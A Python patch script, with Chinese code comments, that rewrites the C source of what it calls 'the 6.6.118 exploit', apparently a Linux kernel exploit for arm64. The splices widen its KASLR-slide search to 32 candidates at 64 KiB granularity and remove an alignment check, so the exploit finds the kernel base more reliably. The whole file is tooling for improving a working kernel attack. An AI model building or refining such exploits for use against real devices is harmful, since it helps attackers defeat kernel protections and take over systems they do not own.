"""Rebuild the 6.6.118 exploit with a 64 KiB-granularity sweep instead of the 4x512 KiB one.

Motivation (from kpgc10kai/Shark#6): on arm64 the virtual KASLR displacement is a random
multiple of 2 MiB *plus* the physical placement modulo 2 MiB.  That remainder is not
necessarily a multiple of 512 KiB, so sweeping {0, 0x80000, 0x100000, 0x180000} is not
sufficient in general.  Sweep 32 candidates at 64 KiB granularity instead.

Three edits, applied bottom-up so line numbers stay valid:
  3. remove the leftover 512 KiB alignment bail in probe_main (it would reject a
     legitimate 64 KiB-aligned slide that the new sweep just found)
  2. pcands[4]  -> 32-candidate loop               (probe path)
  1. cands[4]   -> 32-candidate loop               (--auto calibration path)
"""
import io
import sys

SRC = sys.argv[1]
DST = sys.argv[2]

lines = io.open(SRC, encoding="utf-8").read().split("\n")


def splice(start, end, new_text):
    """Replace 1-indexed inclusive line range [start, end] with new_text lines."""
    body = new_text.split("\n")
    lines[start - 1:end] = body


# --- edit 3: drop the 512 KiB bail (was: if ((g_slide & 0x1fffff) && (g_slide & 0x7ffff)) return 1;) ---
splice(1173, 1175,
       "    /* PATCH: 非 2MiB 对齐不再致命 —— 低21位已由 g_low_adj 补偿。\n"
       "     * 原先的 512KiB 对齐硬检查已删除：64KiB 粒度的合法位移会被它误杀，\n"
       "     * 导致新扫描刚找到正确 low_adj 就立刻放弃。 */")

# --- edit 2: probe sweep, 4 x 512KiB -> 32 x 64KiB ---
splice(1143, 1157,
       "        /* PATCH: 同上，按 64KiB 粒度扫 32 个候选（见 kpgc10kai/Shark#6）。 */\n"
       "        int pbest = 0, pn = -1;\n"
       "\n"
       "        for (int pci = 0; pci < 32; pci++)\n"
       "        {\n"
       "            int pcc;\n"
       "\n"
       "            g_low_adj = (unsigned long long)pci * 0x10000ULL;\n"
       "            pcc = scan_timer_allocs(raw, (size_t)n, getpid(), ptrs, 128, &site0);\n"
       "            if (pcc > pn) { pn = pcc; pbest = pci; }\n"
       "            if (pn >= 128) break;   /* 128 是本次扫描上限，全中即最优 */\n"
       "        }\n"
       "        g_low_adj = (unsigned long long)pbest * 0x10000ULL;\n"
       "        nrec = scan_timer_allocs(raw, (size_t)n, getpid(), ptrs, 128, &site0);")

# --- edit 1: --auto calibration sweep, 4 x 512KiB -> 32 x 64KiB ---
splice(733, 748,
       "        /* PATCH: KASLR slide 的 mod-2MiB 分量未知。arm64 的位移 =\n"
       "         * 2MiB 的随机倍数 + 物理放置 mod 2MiB，后者不保证是 512KiB 的倍数，\n"
       "         * 所以按 64KiB 粒度扫 32 个候选（见 kpgc10kai/Shark#6）。 */\n"
       "        {\n"
       "            int best_ci = 0;\n"
       "\n"
       "            for (int ci = 0; ci < 32; ci++) {\n"
       "                int cc;\n"
       "\n"
       "                g_low_adj = (unsigned long long)ci * 0x10000ULL;\n"
       "                cc = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);\n"
       "                if (cc > c) { c = cc; best_ci = ci; }\n"
       "                if (c >= 512) break;   /* 512 是全中，不可能更好 */\n"
       "            }\n"
       "            g_low_adj = (unsigned long long)best_ci * 0x10000ULL;\n"
       "            c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);\n"
       "        }")

out = "\n".join(lines)
io.open(DST, "w", encoding="utf-8", newline="\n").write(out)

# sanity report
print("wrote %s (%d lines)" % (DST, len(lines)))
for probe in ("cands[4]", "pcands[4]", "0x180000ULL", "0x7ffffULL", "ci < 32", "pci < 32"):
    print("  %-14s -> %d" % (probe, out.count(probe)))
